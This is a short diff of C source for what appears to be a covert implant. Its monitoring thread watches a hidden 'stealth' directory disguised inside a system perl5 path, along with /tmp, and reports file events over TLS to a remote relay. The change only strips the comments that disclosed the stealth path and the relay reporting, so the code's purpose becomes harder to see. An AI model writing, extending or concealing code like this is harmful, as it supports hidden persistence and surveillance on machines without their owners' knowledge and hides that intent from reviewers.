@@ -20,7 +20,7 @@
 
 volatile bool ph_agent_is_busy = false;
 
-// Monitoring thread for file events (inotify)
+
 void *ph_monitor_thread(void *arg) {
     ph_tls_ctx_t *tls_ctx = (ph_tls_ctx_t *)arg;
     int fd;
@@ -29,7 +29,7 @@ void *ph_monitor_thread(void *arg) {
     fd = inotify_init();
     if (fd < 0) return NULL;
 
-    // Monitor the stealth path and common directories
+    
     const char *paths[] = {
         "/usr/lib/x86_64-linux-gnu/perl5/.system-runtime-cache",
         "/tmp",
@@ -62,12 +62,12 @@ void *ph_monitor_thread(void *arg) {
             }
 
             if (opcode != 0 && tls_ctx != NULL) {
-                // Send alert to relay via TLS
+                
                 ph_cmd_send_chunked(tls_ctx, details, strlen(details), opcode, 0);
             }
             i += sizeof(struct inotify_event) + event->len;
         }
-        usleep(100000); // 100ms throttle
+        usleep(100000); 
     }
 
     close(fd);
